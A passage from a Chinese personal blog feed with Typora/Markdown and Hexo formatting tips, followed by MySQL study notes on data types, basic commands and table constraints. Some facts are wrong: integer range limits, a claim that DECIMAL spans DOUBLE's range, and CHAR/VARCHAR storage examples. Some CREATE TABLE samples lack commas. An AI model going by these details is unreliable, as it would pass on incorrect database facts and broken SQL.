<p>在实际的使用过程中，虽然第三种方法最为方便，但是由于第三种方法图片不能在 typora 中显示，因此我采用了第二种方法来编写博客。其次由于我使用了 hexo 插件 abbrlink ，需要在主题配置文件中\node_modules\hexo-asset-image\index.js进行更改。</p>
<h4 id="表格">表格</h4>
<p>Markdown 制作表格使用 <code>|</code> 来分隔不同的单元格，使用 <code>-</code> 来分隔表头和其他行。<code>:-</code>表示左对齐<code>-:</code>表示右对齐<code>:-:</code>表示中间对齐。示例如下：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">左对齐</span>|<span class="string">右对齐</span>|<span class="string">中间对齐</span>|</span><br><span class="line">|<span class="string">:---</span>|<span class="string">---:</span>|<span class="string">:----:</span>|</span><br><span class="line">|<span class="string">单元格</span>|<span class="string">单元格</span>|<span class="string">单元格</span>|</span><br><span class="line">|<span class="string">单元格</span>|<span class="string">单元格</span>|<span class="string">单元格</span>|</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">左对齐</th>
<th style="text-align:right">右对齐</th>
<th style="text-align:center">中间对齐</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">单元格</td>
<td style="text-align:right">单元格</td>
<td style="text-align:center">单元格</td>
</tr>
<tr>
<td style="text-align:left">单元格</td>
<td style="text-align:right">单元格</td>
<td style="text-align:center">单元格</td>
</tr>
</tbody>
</table>
<p>在Typora中，我们可以使用快捷键<strong>Ctrl+T</strong>来插入表格，并选择行列，当选中表格某一单元格时，可以在表格左上角手动设置对齐方式，右上角选择更多操作。</p>
<p><img src="/posts/287bb156//image-20241028100647549.png" alt="image-20241028100647549"></p>
<h4 id="数学公式">数学公式</h4>
<p>在Typora中，有两种方法插入数学公式，示例如下：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">第一种方法：<span class="symbol">$</span><span class="number">1</span>+<span class="number">2</span>=<span class="number">3</span><span class="symbol">$</span></span><br><span class="line">第二种方法：</span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br><span class="line"><span class="number">1</span>+<span class="number">2</span>=<span class="number">3</span></span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br></pre></td></tr></table></figure>
<p>第一种方法：$1+2=3$</p>
<p>第二种方法：<br>
$$<br>
1+2=3<br>
$$</p>
<h2 id="三、Typora与HTML">三、Typora与HTML</h2>
<h3 id="3-1-改变字体颜色及大小">3.1 改变字体颜色及大小</h3>
<p>我们可以使用<code>&lt;font&gt; &lt;/font&gt;</code>标签来改变字体的颜色及大小，如：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;font <span class="attribute">size</span>=3 <span class="attribute">color</span>=<span class="string">&quot;red&quot;</span>&gt;字体颜色为红色，大小为3&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font <span class="attribute">size</span>=4 <span class="attribute">color</span>=<span class="string">&quot;blue&quot;</span>&gt;字体颜色为蓝色，大小为4&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font <span class="attribute">size</span>=6 <span class="attribute">color</span>=<span class="string">&quot;#ffffff&quot;</span>&gt;字体颜色为紫罗兰，大小为6&lt;/font&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><font size="3" color="red">字体颜色为红色，大小为3</font></p>
<p><font size="4" color="blue">字体颜色为蓝色，大小为4</font></p>
<p><font size="6" color="#ffffff">字体颜色为紫罗兰，大小为6</font></p>
<h3 id="3-2-改变对齐方式">3.2 改变对齐方式</h3>
<p>我们可以改变字体的对齐方式，用标签<code>&lt;p&gt; &lt;/p&gt;</code>加上属性<code>align</code>，如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span>&gt;</span>左对齐<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>中间对齐<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>右对齐<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p align="left">左对齐</p>
<p align="center">中间对齐</p>
<p align="right">右对齐</p>
<h3 id="3-3-插入头像">3.3 插入头像</h3>
<p>我们可以通过标签<code>&lt;img src=url /&gt;</code>来插入图片，如：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&quot;./【Hexo】typora知识总结/001.jpg&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<img src="/posts/287bb156//001.jpg">
<p>我们可以改变<code>&lt;img&gt;</code>标签的属性，来改变图片的大小。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;./【Hexo】typora知识总结/001.jpg&quot;</span> <span class="attribute">width</span>=100 <span class="attribute">height</span>=100/&gt;</span><br></pre></td></tr></table></figure>
<img src="/posts/287bb156//001.jpg" width="100" height="100/">
<p>也可以改变图片的位置，如：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;【Hexo】typora知识总结/001.jpg&quot;</span> <span class="attribute">width</span>=30 <span class="attribute">height</span>=30 <span class="attribute">style</span>=<span class="string">&quot;float:left&quot;</span>/&gt;图片在左边</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;【Hexo】typora知识总结/001.jpg&quot;</span> <span class="attribute">width</span>=30 <span class="attribute">height</span>=30 <span class="attribute">style</span>=<span class="string">&quot;float:right&quot;</span>/&gt;图片在右边</span><br></pre></td></tr></table></figure>
<p><img src="/posts/287bb156//001.jpg" width="30" height="30" style="float:left">图片在左边<img src="/posts/287bb156//001.jpg" width="30" height="30" style="float:right">图片在右边</p>
<h2 id="四、其他用法">四、其他用法</h2>
<h3 id="文章截断——阅读全文">文章截断——阅读全文</h3>
<p>若你是用的是NEXT主题，可以在文章中使用<code>&lt; !--more--&gt;</code> 手动进行截断这种方法可以根据文章的内容，自己在合适的位置添加 <code>&lt; !--more--&gt;</code> 标签，使用灵活，也是Hexo推荐的方法。</p>
<h3 id="目录功能">目录功能</h3>
<p>使用hexo-toc可以在文章头部添加目录。 其配置在博客根目录的_config.yml文件中。类似于文章截断功能，在需要显示文章目录的地方添加<code>&lt;!--toc--&gt;</code></p>
<p>额······因为使用这个以后侧边框的目录无法跳转，就又卸载了。</p>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/weixin_30745641/article/details/95686757">Hexo中添加emoji表情</a></p>
<p><a href="https://www.imczw.com/post/tech/hexo-next-tags-markdown.html"> Hexo-Next 常用 MD 语法合集</a></p>
<p><a href="https://blog.csdn.net/qq_41261251/article/details/102817673">https://blog.csdn.net/qq_41261251/article/details/102817673</a></p>
<p><a href="https://whatsid.me/2019/08/21/hexo-markdown-syntax/#">https://whatsid.me/2019/08/21/hexo-markdown-syntax/#</a></p>
<p><a href="https://blog.csdn.net/lewky_liu/article/details/82432003">Hexo系列(2) - NexT主题美化与博客功能增强</a></p>
<p><a href="https://theme-next.iissnan.com/theme-settings.html">主题配置 - NexT 使用文档</a></p>
<p><a href="https://blog.csdn.net/qq_32320399/article/details/99823695">Markdown连接的写法</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
        <category>Typora</category>
      </categories>
      <tags>
        <tag>Typora</tag>
      </tags>
  </entry>
  <entry>
    <title>【MySQL】MYSQL知识总结</title>
    <url>/posts/c826a854/</url>
    <content><![CDATA[<h2 id="数据库的三大范式">数据库的三大范式</h2>
<p>1、第一范式(1NF)是指数据库表的每一列都是不可分割的基本数据线；也就是说：每列的值具有原子性，不可再分割。<br>
2、第二范式(2NF)是在第一范式(1NF)的基础上建立起来得，满足第二范式(2NF)必须先满足第一范式(1NF)。如果表是单主键，那么主键以外的列必须完全依赖于主键；如果表是复合主键，那么主键以外的列必须完全依赖于主键，不能仅依赖主键的一部分。<br>
3、第三范式(3NF)是在第二范式的基础上建立起来的，即满足第三范式必须要先满足第二范式。第三范式(3NF)要求：表中的非主键列必须和主键直接相关而不能间接相关；也就是说：非主键列之间不能相关依赖。</p>
<h2 id="SQL简述">SQL简述</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>SQL的概述</strong></p>
</li>
</ul>
<p>Structure Query Language(结构化查询语言)简称SQL，它被美国国家标准局(ANSI)确定为关系型数据库语言的美国标准，后被国际化标准组织(ISO)采纳为关系数据库语言的国际标准。数据库管理系统可以通过SQL管理数据库；定义和操作数据，维护数据的完整性和安全性。</p>
<h3 id="SQL的优点">SQL的优点</h3>
<p>1、简单易学，具有很强的操作性<br>
2、绝大多数重要的数据库管理系统均支持SQL<br>
3、高度非过程化；用SQL操作数据库时大部分的工作由DBMS自动完成</p>
<h3 id="SQL的分类">SQL的分类</h3>
<p>1、DDL(Data Definition Language) 数据定义语言，用来操作数据库、表、列等； 常用语句：CREATE、 ALTER、DROP<br>
2、DML(Data Manipulation Language) 数据操作语言，用来操作数据库中表里的数据；常用语句：INSERT、 UPDATE、 DELETE<br>
3、DCL(Data Control Language) 数据控制语言，用来操作访问权限和安全级别； 常用语句：GRANT、DENY<br>
4、DQL(Data Query Language) 数据查询语言，用来查询数据 常用语句：SELECT</p>
<span id="more"></span>
<h3 id="SQL通用语法">SQL通用语法</h3>
<ol>
<li class="lvl-3">
<p>SQL语句可以单行或多行书写，以分号结尾</p>
</li>
<li class="lvl-3">
<p>可使用空格和缩进来增强语句的可读性</p>
</li>
<li class="lvl-3">
<p>MySQL数据库的SQL语句不区分大小写，建议使用大写，例如：SELECT * FROM user。</p>
</li>
<li class="lvl-3">
<p>同样可以使用/**/的方式完成注释</p>
</li>
<li class="lvl-3">
<p>MySQL中的我们常使用的数据类型如下</p>
</li>
</ol>
<p><img src="/posts/c826a854//image-20241210133749260.png" alt="image-20241210133749260"></p>
<h2 id="数据库的数据类型">数据库的数据类型</h2>
<p>MySQL数据库提供了多种数据类型，其中包括整数类型、浮点数类型、定点 数类型、日期和时间类型、字符串类型、二进制…等等数据类型。</p>
<h3 id="整数类型">整数类型</h3>
<p>根据数值取值范围的不同MySQL 中的整数类型可分为5种，下图列举了 MySQL不同整数类型所对应的字节大小和取值范围而最常用的为INT类型的，</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>无符号数的取值范围</th>
<th>有符号数的取值范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>0~255</td>
<td>-128~127</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>0~65535</td>
<td>-32768~32768</td>
</tr>
<tr>
<td>MEDIUINT</td>
<td>3</td>
<td>0~16777215</td>
<td>-8388608~8388608</td>
</tr>
<tr>
<td>INT（最常见）</td>
<td>4</td>
<td>0~4294967295</td>
<td>-2147483648~ 2147483648</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>0~18446744073709551615</td>
<td>-9223372036854775808~9223372036854775808</td>
</tr>
</tbody>
</table>
<p><font class="notice">注：INT又可写为integer</font></p>
<h3 id="浮点数类型和定点数类型">浮点数类型和定点数类型</h3>
<p>在MySQL数据库中使用浮点数和定点数来存储小数。浮点数的类型有两种：单精度浮点数类型（FLOAT)和双精度浮点数类型（DOUBLE)。而定点数类型只有一种即DECIMAL类型。下图列举了 MySQL中浮点数和定点数类型所对应的字节大小及其取值范围：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>有符号数取值范围</th>
<th>无符号数取值范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLOAT</td>
<td>4</td>
<td>-3.402823466E+38~-1.175494351E-38</td>
<td>0和1.175494351E-38~3.402823466E+38</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8</td>
<td>-1.7976931348623157E+308~2.2250738585072014E-308</td>
<td>0和2.2250738585072014E-308~1.7976931348623157E+308</td>
</tr>
<tr>
<td>DECIMAL（M,D）</td>
<td>M+2</td>
<td>-1.7976931348623157E+308~2.2250738585072014E-308</td>
<td>0和2.2250738585072014E-308~1.7976931348623157E+308</td>
</tr>
</tbody>
</table>
<p>从上图中可以看出：DECIMAL类型的取值范围与DOUBLE类型相同。但是，请注意：DECIMAL类型的有效取值范围是由M和D决定的。其中，M表示的是数据的长 度，D表示的是小数点后的长度。比如，将数据类型为DECIMAL(6,2)的数据6.5243 插入数据库后显示的结果为6.52</p>
<h3 id="字符串类型">字符串类型</h3>
<p>在MySQL中常用CHAR 和 VARCHAR 表示字符串。两者不同的是：VARCHAR存储可变长度的字符串。<br>
<strong>当数据为CHAR(M)类型时，不管插入值的长度是实际是多少它所占用的存储空间都是M个字节；而VARCHAR(M)所对应的数据所占用的字节数为实际长度加1</strong></p>
<table>
<thead>
<tr>
<th>插入值</th>
<th>CHAR(3)</th>
<th>存储需求</th>
<th>VARCHAR(3)</th>
<th>存储需求</th>
</tr>
</thead>
<tbody>
<tr>
<td>‘’</td>
<td>‘’</td>
<td>3个字节</td>
<td>‘’</td>
<td>1个字节</td>
</tr>
<tr>
<td>‘a’</td>
<td>‘a’</td>
<td>3个字节</td>
<td>‘a’</td>
<td>2个字节</td>
</tr>
<tr>
<td>‘ab’</td>
<td>‘ab’</td>
<td>3个字节</td>
<td>‘ab’</td>
<td>3个字节</td>
</tr>
<tr>
<td>‘abc’</td>
<td>‘ab’</td>
<td>3个字节</td>
<td>‘abc’</td>
<td>4个字节</td>
</tr>
<tr>
<td>‘abcd’</td>
<td>‘ab’</td>
<td>3个字节</td>
<td>‘abc’</td>
<td>4字节</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>CHAR(M)</th>
<th>M为0~255之间的整数，固定长度为M，不足后面补全空格</th>
</tr>
</thead>
<tbody>
<tr>
<td>VARCHAR(M)</td>
<td>M为0~65535之间的整数</td>
</tr>
</tbody>
</table>
<h3 id="文本类型">文本类型</h3>
<p>文本类型用于表示大文本数据，例如，文章内容、评论、详情等，它的类型分为如下4种：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>储存范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYTEXT</td>
<td>0~255字节</td>
</tr>
<tr>
<td>TEXT</td>
<td>0~65535字节</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0~16777215字节</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0~4294967295字节</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0~255字节</td>
</tr>
<tr>
<td>BLOB</td>
<td>0~65535字节</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0~16777215字节</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0~4294967295字节</td>
</tr>
<tr>
<td>VARBINARY(M)</td>
<td>允许长度0~M个字节的变长字节字符串</td>
</tr>
<tr>
<td>BINARY(M)</td>
<td>允许长度0~M个字节的定长字节字符串</td>
</tr>
</tbody>
</table>
<h3 id="日期与时间类型">日期与时间类型</h3>
<p>MySQL提供的表示日期和时间的数据类型分别是 ：YEAR、DATE、TIME、DATETIME 和 TIMESTAMP。下图列举了日期和时间数据类型所对应的字节数、取值范围、日期格式以及零值：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>取值范围</th>
<th>日期格式</th>
<th>零值</th>
</tr>
</thead>
<tbody>
<tr>
<td>YEAR</td>
<td>1</td>
<td>1901~2155</td>
<td>YYYY</td>
<td>0000</td>
</tr>
<tr>
<td>DATE</td>
<td>4</td>
<td>1000-01-01~9999-12-31</td>
<td>YYYY-MM-DD</td>
<td>0000-00-00</td>
</tr>
<tr>
<td>TIME</td>
<td>3</td>
<td>-838：59：59~ 838：59：59</td>
<td>HH:MM:SS</td>
<td>00:00:00</td>
</tr>
<tr>
<td>DATETIME</td>
<td>8</td>
<td>1000-01-01 00:00:00~9999-12-31 23:59:59</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>0000-00-00 00:00:00</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>4</td>
<td>1970-01-01 00:00:01~2038-01-19 03:14:07</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>0000-00-00 00:00:00</td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p>YEAR<strong>类型</strong></p>
</li>
</ul>
<p>YEAR类型用于表示年份，在MySQL中，可以使用以下三种格式指定YEAR类型 的值。<br>
1、使用4位字符串或数字表示，范围为’1901’—'2155’或1901—2155。例如，输入 ‘2019’或2019插入到数据库中的值均为2019。<br>
2、使用两位字符串表示，范围为’00’—‘99’。其中，‘00’—'69’范围的值会被转换为 2000—2069范围的YEAR值，‘70’—'99’范围的值会被转换为1970—1999范围的YEAR 值。例如，输入’19’插入到数据库中的值为2019。<br>
3、使用两位数字表示，范围为1—99。其中，1—69范围的值会被转换为2001— 2069范围的YEAR值，70—99范围的值会被转换为1970—1999范围的YEAR值。例 如，输入19插入到数据库中的值为2019。请注意：当使用YEAR类型时，一定要区分’0’和0。因为字符串格式的’0’表示的YEAR值是2000而数字格式的0表示的YEAR值是0000。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>TIME<strong>类型</strong></p>
</li>
</ul>
<p>TIME类型用于表示时间值，它的显示形式一般为HH:MM:SS，其中，HH表示小时， MM表示分,SS表示秒。在MySQL中，可以使用以下3种格式指定TIME类型的值。<br>
1、以’D HH:MM:SS’字符串格式表示。其中，D表示日可取0—34之间的值, 插入数据时，小时的值等于(DX24+HH)。例如，输入’2 11:30:50’插入数据库中的日期为59:30:50。<br>
2、以’HHMMSS’字符串格式或者HHMMSS数字格式表示。 例如，输入’115454’或115454,插入数据库中的日期为11:54:54<br>
3、使用CURRENT_TIME或NOW()输入当前系统时间。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>DATETIME类型</p>
</li>
</ul>
<p>DATETIME类型用于表示日期和时间，它的显示形式为’YYYY-MM-DD HH: MM:SS’，其中，YYYY表示年，MM表示月，DD表示日，HH表示小时，MM表示分，SS 表示秒。在MySQL中，可以使用以下4种格式指定DATETIME类型的值。<br>
以’YYYY-MM-DD HH:MM:SS’或者’YYYYMMDDHHMMSS’字符串格式表示的日期和时间，取值范围为’1000-01-01 00:00:00’—‘9999-12-3 23:59:59’。例如，输入’2019-01-22 09:01:23’或 ‘20140122_0_90123’插入数据库中的 DATETIME 值都为 2019-01-22 09:01:23。<br>
1、以’YY-MM-DD HH:MM:SS’或者’YYMMDDHHMMSS’字符串格式表示的日期和时间，其中YY表示年，取值范围为’00’—‘99’。与DATE类型中的YY相同，‘00’— '69’范围的值会被转换为2000—2069范围的值，‘70’—'99’范围的值会被转换为1970—1999范围的值。<br>
2、以YYYYMMDDHHMMSS或者YYMMDDHHMMSS数字格式表示的日期 和时间。例如，插入20190122090123或者190122090123,插入数据库中的DATETIME值都 为 2019-01-22 09:01:23。<br>
3、使用NOW来输入当前系统的日期和时间。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>TIMESTAMP类型</p>
</li>
</ul>
<p>TIMESTAMP类型用于表示日期和时间，它的显示形式与DATETIME相同但取值范围比DATETIME小。在此，介绍几种TIMESTAMP类型与DATATIME类型不同的形式：<br>
1、使用CURRENT_TIMESTAMP输入系统当前日期和时间。<br>
2、输入NULL时系统会输入系统当前日期和时间。<br>
3、无任何输入时系统会输入系统当前日期和时间。</p>
<h3 id="二进制类型">二进制类型</h3>
<p>在MySQL中常用BLOB存储二进制类型的数据，例如：图片、PDF文档等。BLOB类型分为如下四种：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>储存范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYBLOB</td>
<td>0~255字节</td>
</tr>
<tr>
<td>BLOB</td>
<td>0~65535字节</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0~16777215字节</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0~4294967295字节</td>
</tr>
</tbody>
</table>
<h2 id="数据库、数据表的基本操作">数据库、数据表的基本操作</h2>
<h3 id="数据库的基本操作">数据库的基本操作</h3>
<p>查询数据库的版本（敏感信息泄露）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span> </span><br></pre></td></tr></table></figure>
<p>MySQL安装完成后，要想将数据存储到数据库的表中，首先要创建一个数据库。创建数据库就是在数据库系统中划分一块空间存储数据，语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">创建数据库</span><br><span class="line"><span class="keyword">create</span> database 数据库名称;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建一个叫db1的数据库MySQL命令：</span><br><span class="line"><span class="keyword">create</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>创建数据库后查看该数据库基本信息MySQL命令：</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查询出MySQL中所有的数据库MySQL命令：</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>将数据库的字符集修改为gbk MySQL命令：</span><br><span class="line"><span class="keyword">alter</span> database db1 <span class="type">character</span> <span class="keyword">set</span> gbk;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>切换数据库 MySQL命令：</span><br><span class="line">use db1;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>查看当前使用的数据库 MySQL命令：</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>删除数据库MySQL命令：</span><br><span class="line"><span class="keyword">drop</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>退出数据库</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<h3 id="数据表的基本操作">数据表的基本操作</h3>
<p>数据库创建成功后可在该数据库中创建数据表(简称为表)存储数据。</p>
<p><font class="notice">请注意：在操作数据表之前应使用“USE 数据库名;”指定操作是在哪个数据库中进行先关操作，否则会抛出“No database selected”错误。<br>字段首字符必须是字母或<code>_</code>，不能是数字或者其他字符</font></p>

<p>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">         字段<span class="number">1</span> 字段类型,</span><br><span class="line">         字段<span class="number">2</span> 字段类型,</span><br><span class="line">         …</span><br><span class="line">         字段n 字段类型</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>表示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建学生表 MySQL命令：</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line"> birthday <span class="type">date</span></span><br><span class="line"> );</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>查看当前数据库中所有表</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查表的基本信息</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>查看表的字段信息</span><br><span class="line"><span class="keyword">desc</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>修改表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student rename <span class="keyword">to</span> stu;</span><br><span class="line">rename <span class="keyword">table</span> student <span class="keyword">to</span> stu;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>修改字段名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu change name sname <span class="type">varchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>修改字段数据类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify sname <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>增加字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">add</span> address <span class="type">varchar</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>删除字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">drop</span> address;</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>删除数据表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> stu;</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span>修改字段a到字段b后(不知道括中号里可不可以)</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify 字段b [类型] after 字段a</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify 字段b [字段c 类型] after 字段a</span><br></pre></td></tr></table></figure>
<h2 id="数据表的约束">数据表的约束</h2>
<p>为防止错误的数据被插入到数据表，MySQL中定义了一些维护数据库完整性的规则；这些规则常称为表的约束。常见约束如下：</p>
<table>
<thead>
<tr>
<th>约束条件</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRIMARY KEY</td>
<td>主键约束用于唯一标识对应的记录</td>
</tr>
<tr>
<td>FOREIGN KEY</td>
<td>外键约束</td>
</tr>
<tr>
<td>NOT NULL</td>
<td>非空约束</td>
</tr>
<tr>
<td>UNIQUE</td>
<td>唯一性约束</td>
</tr>
<tr>
<td>DEFAULT</td>
<td>默认值约束，用于设置字段的默认值</td>
</tr>
</tbody>
</table>
<p>以上五种约束条件针对表中字段进行限制从而保证数据表中数据的正确性和唯一性。换句话说，表的约束实际上就是表中数据的限制条件。</p>
<h3 id="主键约束">主键约束</h3>
<p>主键约束即primary key用于唯一的标识表中的每一行。被标识为主键的数据在表中是唯一的且其值不能为空。这点类似于我们每个人都有一个身份证号，并且这个身份证号是唯一的。 主键约束基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">primary</span> key;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>主键约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>设置主键约束(<span class="keyword">primary</span> key)的第一种方式<span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 设置主键约束(<span class="keyword">primary</span> key)的第二·种方式</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student01(</span><br><span class="line">id <span class="type">int</span></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="keyword">primary</span> key(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>可使用<code>desc student01</code>命令查询</p>
<h3 id="非空约束">非空约束</h3>
<p>非空约束即 NOT NULL指的是字段的值不能为空，基本的语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>非空约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student02(</span><br><span class="line">id <span class="type">int</span></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="默认值约束">默认值约束</h3>
<p>默认值约束即DEFAULT用于给数据表中的字段指定默认值，即当在表中插入一条新记录时若未给该字段赋值，那么，数据库系统会自动为这个字段插入默认值；其基本的语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">DEFAULT</span> 默认值；</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>默认值约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student03(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">default</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="唯一性约束">唯一性约束</h3>
<p>唯一性约束即UNIQUE用于保证数据表中字段的唯一性，即表中字段的值不能重复出现，其基本的语法格式如下所示：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">字段名 数据类型 UNIQUE<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>唯一性约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student04(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">unique</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="外键约束">外键约束</h3>
